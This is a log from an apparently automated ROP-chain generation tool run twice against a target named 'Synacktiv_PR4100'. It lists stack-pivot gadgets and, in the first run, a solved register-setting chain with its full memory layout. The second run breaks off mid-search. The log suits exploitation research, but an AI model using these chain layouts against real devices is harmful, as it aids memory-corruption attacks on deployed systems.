2025-10-22 15:22:25.600 | INFO     | __main__:complete_test:91 - Start Synacktiv_PR4100
2025-10-22 15:22:26.094 | INFO     | find_stack_pivot:main:147 - Start Find Stack Pivot Gadet Chain
2025-10-22 15:22:26.667 | INFO     | find_stack_pivot:main:154 - Finish Find Stack Pivot Gadget Chain
2025-10-22 15:22:26.667 | INFO     | find_stack_pivot:main:160 - Start Solve Stack Pivot Gadget Chain
2025-10-22 15:22:26.943 | INFO     | find_stack_pivot:main:164 - Finsh Solve Stack Pivot Gadget Chain
2025-10-22 15:22:26.944 | SUCCESS  | find_stack_pivot:main:165 - Find and Solve Pivot Gadget Chain Time : 0.2760932445526123
2025-10-22 15:22:26.944 | SUCCESS  | __main__:complete_test:103 - Pivot Gadget Chain Found : 2
2025-10-22 15:22:26.944 | INFO     | __main__:complete_test:107 - Gadget 0 : ('0x00000000004039c2 -> lea rsp, [rsp + 0x108] ; ret',)
2025-10-22 15:22:26.944 | INFO     | __main__:complete_test:107 - Gadget 1 : ('0x0000000000403bfe -> lea rsp, [rsp + 0x140] ; pop rbx ; ret',)
2025-10-22 15:22:26.944 | INFO     | __main__:complete_test:110 - Choose Gadget 0
2025-10-22 15:22:26.944 | INFO     | __main__:complete_test:111 - ('0x00000000004039c2 -> lea rsp, [rsp + 0x108] ; ret',)
2025-10-22 15:22:26.944 | INFO     | __main__:complete_test:119 - [{15: '0xdeadbeef'}, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45]]
2025-10-22 15:22:26.944 | INFO     | __main__:complete_test:121 - Start To Find Register Gadget Chain
2025-10-22 15:22:26.944 | INFO     | __main__:complete_test:122 - Change Memory Layout to Adapt Bad Memory
2025-10-22 15:22:26.950 | INFO     | __main__:complete_test:161 - Adapt Memory Finished
2025-10-22 15:22:26.950 | INFO     | __main__:complete_test:162 - Adapt Memory Pivot Gadget Chain : ['0x00000000004039c2 -> lea rsp, [rsp + 0x108] ; ret']
2025-10-22 15:22:26.950 | INFO     | __main__:complete_test:165 - Initialize Register and Memory Context
2025-10-22 15:22:26.950 | INFO     | __main__:complete_test:174 - Start Set Mem And Reg
2025-10-22 15:22:26.950 | INFO     | find_reg_gadget_chain:main:914 - Get Set Reg Edges
2025-10-22 15:22:27.053 | INFO     | find_reg_gadget_chain:main:963 - Find Reg Setting Gadget Chain
2025-10-22 15:22:27.054 | INFO     | find_reg_gadget_chain:main:964 - Target Register ['rdi', 'rsi', 'rdx', 'rcx']
2025-10-22 15:23:14.913 | SUCCESS  | find_reg_gadget_chain:main:976 - Find Set Registers Gadget Chain!
2025-10-22 15:23:14.915 | SUCCESS  | find_reg_gadget_chain:main:978 - Register Time: 47.85841345787048
2025-10-22 15:23:14.916 | SUCCESS  | find_reg_gadget_chain:main:981 - [[{16: '0x0000000000402171', 17: '0x1000', 18: '0x0000000000402dfb', 19: '0xfffffffffffffffd', 20: '0x402915', 21: '0x0000000000402dfb', 22: '0x607800', 23: '0x00000000004020ab', 24: '0xa', 27: '0x40524b', 28: '0xdeadbe03'}, [['0x0000000000402171'], ['0x0000000000402dfb', '0x0000000000402915'], ['0x0000000000402dfb'], ['0x00000000004020ab', '0x000000000040524b']]]]
2025-10-22 15:23:14.919 | INFO     | __main__:complete_test:190 - Finall Gadget Chain Layout : {16: '0x0000000000402171', 17: '0x1000', 18: '0x0000000000402dfb', 19: '0xfffffffffffffffd', 20: '0x402915', 21: '0x0000000000402dfb', 22: '0x607800', 23: '0x00000000004020ab', 24: '0xa', 27: '0x40524b', 28: '0xdeadbe03', 15: '0x0000000000401b13'}
2025-10-22 15:23:14.972 | SUCCESS  | __main__:complete_test:192 - Synacktiv_PR4100 Reg check Success
2026-01-03 21:39:44.717 | INFO     | __main__:complete_test:91 - Start Synacktiv_PR4100
2026-01-03 21:39:44.765 | INFO     | find_stack_pivot:main:147 - Start Find Stack Pivot Gadet Chain
2026-01-03 21:39:44.900 | INFO     | find_stack_pivot:main:154 - Finish Find Stack Pivot Gadget Chain
2026-01-03 21:39:44.901 | INFO     | find_stack_pivot:main:160 - Start Solve Stack Pivot Gadget Chain
2026-01-03 21:39:44.984 | INFO     | find_stack_pivot:main:164 - Finsh Solve Stack Pivot Gadget Chain
2026-01-03 21:39:44.985 | SUCCESS  | find_stack_pivot:main:165 - Find and Solve Pivot Gadget Chain Time : 0.08306455612182617
2026-01-03 21:39:44.985 | SUCCESS  | __main__:complete_test:103 - Pivot Gadget Chain Found : 2
2026-01-03 21:39:44.985 | INFO     | __main__:complete_test:107 - Gadget 0 : ('0x00000000004039c2 -> lea rsp, [rsp + 0x108] ; ret',)
2026-01-03 21:39:44.985 | INFO     | __main__:complete_test:107 - Gadget 1 : ('0x0000000000403bfe -> lea rsp, [rsp + 0x140] ; pop rbx ; ret',)
2026-01-03 21:39:44.985 | INFO     | __main__:complete_test:110 - Choose Gadget 0
2026-01-03 21:39:44.986 | INFO     | __main__:complete_test:111 - ('0x00000000004039c2 -> lea rsp, [rsp + 0x108] ; ret',)
2026-01-03 21:39:44.986 | INFO     | __main__:complete_test:119 - [{15: '0xdeadbeef'}, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45]]
2026-01-03 21:39:44.986 | INFO     | __main__:complete_test:121 - Start To Find Register Gadget Chain
2026-01-03 21:39:44.986 | INFO     | __main__:complete_test:122 - Change Memory Layout to Adapt Bad Memory
2026-01-03 21:39:44.991 | INFO     | __main__:complete_test:161 - Adapt Memory Finished
2026-01-03 21:39:44.991 | INFO     | __main__:complete_test:162 - Adapt Memory Pivot Gadget Chain : ['0x00000000004039c2 -> lea rsp, [rsp + 0x108] ; ret']
2026-01-03 21:39:44.992 | INFO     | __main__:complete_test:165 - Initialize Register and Memory Context
2026-01-03 21:39:44.992 | INFO     | __main__:complete_test:174 - Start Set Mem And Reg
2026-01-03 21:39:44.992 | INFO     | find_reg_gadget_chain:main:916 - Get Set Reg Edges
2026-01-03 21:39:45.018 | INFO     | find_reg_gadget_chain:main:965 - Find Reg Setting Gadget Chain
2026-01-03 21:39:45.018 | INFO     | find_reg_gadget_chain:main:966 - Target Register ['rdi', 'rsi', 'rdx', 'rcx']
